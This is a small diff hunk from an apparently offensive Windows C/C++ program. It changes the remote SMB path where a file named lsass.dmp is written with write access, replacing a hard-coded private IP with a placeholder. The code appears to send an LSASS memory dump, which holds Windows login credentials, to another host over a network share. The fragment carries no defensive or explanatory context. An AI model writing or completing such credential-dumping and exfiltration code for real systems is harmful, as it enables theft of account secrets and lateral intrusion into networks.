@@ -136,7 +136,7 @@ int wmain() {
     }
 
     hRemoteFile = CreateFileW(
-        L"\\\\192.168.1.5\\share\\lsass.dmp",
+        L"\\\\IP\\Share\\lsass.dmp",
         GENERIC_WRITE,
         0,
         NULL,
